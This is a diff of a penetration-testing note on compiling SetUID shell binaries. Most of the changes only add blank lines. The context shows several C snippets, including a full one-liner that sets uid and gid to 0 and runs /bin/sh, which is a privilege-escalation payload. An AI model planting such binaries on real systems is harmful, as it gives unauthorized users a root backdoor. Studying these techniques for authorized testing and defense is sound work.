@@ -19,11 +19,21 @@ updated_at: '2023-05-30T20:04:29.116420+00:00'
 
 Compile this C Code as a SUID binary
 
+
+
 ## How to Compile C Code
+
+
 
 **Command**: [[gcc Compile C Code Binary]]
 
+
+
+
+
 > SetUID execvp shell C Code
+
+
 
 **Code** ([[#include <stdio.h>
 #include <stdlib.h>
@@ -43,7 +53,11 @@ int main(int argc, char *argv[]) {
 
 ```
 
+
+
 > SetUID execl shell One-Liner C Code
+
+
 
 **Code** ([[int main(void) {setgid(0); setuid(0);execl("/bin/s]]):
 
@@ -51,7 +65,11 @@ int main(int argc, char *argv[]) {
 int main(void) {setgid(0); setuid(0);execl("/bin/sh","sh",0);return 0;}
 ```
 
+
+
 > SetUID execvp "RUN AS" C Code
+
+
 
 **Code** ([[#include <stdio.h>
 #include <unistd.h>
@@ -69,7 +87,11 @@ int main(int argc, char *argv[]) {
 
 ```
 
+
+
 > SetUID specify Group C Code
+
+
 
 **Code** ([[#include <unistd.h>
 #include <sys/types.h>
@@ -96,3 +118,39 @@ int main (int argc, char** argv) {
     return 0;
 }
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
